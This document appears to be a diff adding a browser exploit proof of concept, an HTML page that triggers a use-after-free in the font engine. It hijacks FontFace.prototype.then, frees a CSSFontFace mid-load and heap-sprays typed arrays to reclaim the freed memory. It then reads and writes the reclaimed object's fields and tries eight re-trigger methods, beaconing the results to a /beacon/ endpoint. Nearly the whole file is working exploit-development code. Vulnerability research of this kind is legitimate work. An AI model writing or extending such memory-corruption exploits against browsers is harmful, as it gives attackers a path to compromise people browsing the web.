@@ -1,0 +1,193 @@
+<!--
+  p585: Post-write mutation + re-trigger scan.
+
+  After UAF fires and engine writes T/W/RC/KC, we set KC=42 (sentinel)
+  and try 8 re-trigger methods to see if the engine re-accesses the
+  CSSFontFace through pa's dangling pointer.
+
+  Detection: if RC changes from 3 (re-bumped) or KC changes from 42,
+  the engine re-accessed the buffer.
+
+  Re-triggers (safest → most aggressive):
+    R1: pa.status read
+    R2: pa.family read
+    R3: document.fonts.check() (pa not in set)
+    R4: document.fonts.add(pa) (re-add to set)
+    R5: document.fonts.check() (pa now in set)
+    R6: styled text + force layout
+    R7: document.fonts.load() (async)
+    R8: pa.load() (async)
+
+  400ms + 1500ms async checks catch delayed re-access.
+
+  CRASH_CLASS: HIGH
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p</title>
+<style id="v">@font-face{font-family:sa;src:local(Arial);unicode-range:U+0042}</style>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+m,false);x.send();}catch(e){}}
+function rD(v,o){return(v[o]|0)+((v[o+1]|0)<<8)+((v[o+2]|0)<<16)+((v[o+3]|0)*0x1000000);}
+function rQ(v,o){var s='';for(var j=7;j>=0;j--)s+=('0'+v[o+j].toString(16)).slice(-2);return s;}
+function wD(v,o,x){v[o]=x&0xFF;v[o+1]=(x>>>8)&0xFF;v[o+2]=(x>>>16)&0xFF;v[o+3]=(x>>>24)&0xFF;}
+
+function main(){
+b('G');
+var pa=new FontFace('pa','local(Helvetica)',{unicodeRange:'U+0041'});
+document.fonts.add(pa);void pa.loaded;
+var fired=0;
+Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+get:function(){if(fired)return;fired=1;
+document.getElementById('v').remove();
+try{document.fonts.delete(this);}catch(e){}
+document.body.offsetHeight;
+b('F');
+var lane=[];
+for(var i=0;i<2048;i++){
+  var u=new Uint8Array(new ArrayBuffer(192));
+  wD(u,0x00,2);
+  wD(u,0x60,0);
+  wD(u,0x64,0xFFFFFFFF);
+  u[0x82]=3;
+  lane.push(u);
+}
+b('S'+lane.length);
+window._l=lane;
+window._pa=pa;
+return;},set:function(){}});
+
+document.fonts.load('1em pa, sa','AB').then(function(){},function(){});
+
+// Phase A: read baseline at 80ms
+setTimeout(function(){
+  var lane=window._l;if(!lane)return;
+  var hi=-1;
+  for(var i=0;i<lane.length;i++){
+    var v=lane[i],rc=rD(v,0);
+    var t0=v[0x58]|v[0x59]|v[0x5A]|v[0x5B]|v[0x5C]|v[0x5D]|v[0x5E]|v[0x5F];
+    if(rc!==2||t0){hi=i;break;}
+  }
+  if(hi<0){b('MISS');return;}
+  window._hi=hi;
+
+  var v=lane[hi];
+  var rc_a=rD(v,0);
+  var kc_a=rD(v,0x60);
+  var T=rQ(v,0x58);
+  var W=rQ(v,0x68);
+  b('H'+hi+',RC='+rc_a+',KC='+kc_a+',T='+T+',W='+W);
+  window._rc_a=rc_a;
+},80);
+
+// Phase B: sync re-triggers at 150ms
+setTimeout(function(){
+  var lane=window._l;if(!lane)return;
+  var hi=window._hi;if(hi===undefined)return;
+  var v=lane[hi];
+  var pa=window._pa;
+  var rc_a=window._rc_a;
+
+  function check(name){
+    var rc=rD(v,0);
+    var kc=rD(v,0x60);
+    if(rc!==rc_a||kc!==42){
+      b(name+'-HIT,RC='+rc+',KC='+kc);
+      wD(v,0x60,42); // reset sentinel
+      return true;
+    }
+    b(name+'-no');
+    return false;
+  }
+
+  // Set sentinel
+  wD(v,0x60,42);
+
+  // R1: pa.status
+  try{var s1=pa.status;b('R1s='+s1);}catch(e){b('R1-err');}
+  check('R1');
+
+  // R2: pa.family
+  wD(v,0x60,42);
+  try{var f1=pa.family;b('R2f='+f1);}catch(e){b('R2-err');}
+  check('R2');
+
+  // R3: fonts.check (pa NOT in set yet)
+  wD(v,0x60,42);
+  try{var c1=document.fonts.check('16px pa','A');b('R3c='+c1);}catch(e){b('R3-err');}
+  check('R3');
+
+  // R4: re-add pa to document.fonts
+  wD(v,0x60,42);
+  try{document.fonts.add(pa);b('R4-added');}catch(e){b('R4-err:'+e.message);}
+  check('R4');
+
+  // R5: fonts.check (pa now IN set)
+  wD(v,0x60,42);
+  try{var c2=document.fonts.check('16px pa','A');b('R5c='+c2);}catch(e){b('R5-err');}
+  check('R5');
+
+  // R6: styled text + force layout
+  wD(v,0x60,42);
+  try{
+    var d=document.createElement('div');
+    d.style.fontFamily='pa, sans-serif';
+    d.textContent='ABCDEF';
+    document.body.appendChild(d);
+    var h=d.offsetHeight;
+    b('R6-layout,h='+h);
+  }catch(e){b('R6-err');}
+  check('R6');
+
+  // R7: document.fonts.load (async — check later)
+  wD(v,0x60,42);
+  try{
+    document.fonts.load('16px pa','A').then(
+      function(){b('R7-resolved');},
+      function(){b('R7-rejected');}
+    );
+    b('R7-fired');
+  }catch(e){b('R7-err');}
+  check('R7-sync');
+
+  // R8: pa.load() (async — check later)
+  wD(v,0x60,42);
+  try{
+    pa.load().then(
+      function(){b('R8-resolved');},
+      function(){b('R8-rejected');}
+    );
+    b('R8-fired');
+  }catch(e){b('R8-err');}
+  check('R8-sync');
+
+},150);
+
+// Phase C: async check at 400ms
+setTimeout(function(){
+  var lane=window._l;if(!lane)return;
+  var hi=window._hi;if(hi===undefined)return;
+  var v=lane[hi];
+  var rc=rD(v,0);
+  var kc=rD(v,0x60);
+  var T=rQ(v,0x58);
+  b('ASYNC,RC='+rc+',KC='+kc+',T='+T);
+  if(rc!==window._rc_a||kc!==42) b('ASYNC-RETRIGGER');
+  else b('ASYNC-no');
+},400);
+
+// Phase D: late check at 1500ms
+setTimeout(function(){
+  var lane=window._l;if(!lane)return;
+  var hi=window._hi;if(hi===undefined)return;
+  var v=lane[hi];
+  var rc=rD(v,0);
+  var kc=rD(v,0x60);
+  b('LATE,RC='+rc+',KC='+kc);
+  if(rc!==window._rc_a||kc!==42) b('LATE-RETRIGGER');
+  else b('LATE-no');
+  b('ALIVE');
+},1500);
+
+setTimeout(function(){b('ALIVE2');},3000);
+}
+setTimeout(main,0);
+</script></head><body>p</body></html>
